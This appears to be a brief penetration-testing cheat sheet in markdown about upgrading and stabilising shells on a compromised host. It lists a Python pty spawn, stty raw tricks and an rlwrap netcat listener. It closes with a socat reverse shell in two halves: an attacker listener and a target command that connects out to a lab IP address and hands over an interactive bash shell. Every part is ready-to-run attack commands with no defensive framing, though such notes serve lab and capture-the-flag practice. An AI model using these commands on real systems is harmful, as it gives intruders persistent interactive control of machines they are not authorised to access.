# Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

Ctrl+z

stty raw -echo; fg 
```

# rlwrap

```bash
rlwrap nc -lvnp <port>

Ctrl+z

stty raw -echo; fg
```

# socat reverse shell

**attacker**
```bash
# socat TCP-L:<port> FILE:`tty`,raw,echo=0

socat tcp-l:53 file:`tty`,raw,echo=0
```

**target**
```bash
# socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

socat tcp:192.168.56.101:54 exec:"bash -li",pty,stderr,sigint,setsid,sane
```
